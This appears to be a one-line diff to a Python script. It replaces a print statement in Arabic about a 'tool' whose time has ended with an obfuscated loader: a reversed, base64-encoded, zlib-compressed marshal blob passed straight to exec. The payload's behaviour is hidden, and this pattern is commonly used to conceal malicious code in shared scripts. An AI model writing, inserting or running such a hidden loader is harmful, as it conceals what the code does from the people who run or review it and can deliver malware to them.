@@ -1,1 +1,1 @@
-print(" تم انتهاء وقت الاداة ارسل صور صيد وافعله 🫣")
+_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'=4STKGIABEjsxEHMxCTcJRgXBhB7wEIsi7NpmT5pmXesuZyAdBQcUIzVTK1KTJbAP5cSixNlWRKlx+2UKOv8LoIxAa5pnGjbyt4SYebxlUcqlWYqFxxW23kEKKZvw8NAPDTh2185jFX28y23WfTrbWoLNn/Y+l9vTzMzN9s0KLAwAjM248TyR/9V/kzLE9aNk86P5gSt4Qbq0MKJz2zLcFLK/+lSYDKpkOqMAFap+1LIXaeTGAmigakRmZNV2Sl1oYJLmTl5oYsQjryUBEWlxoYKFGiihcYMFGShiAkGFTMAsDEzDAkZLxJe'))
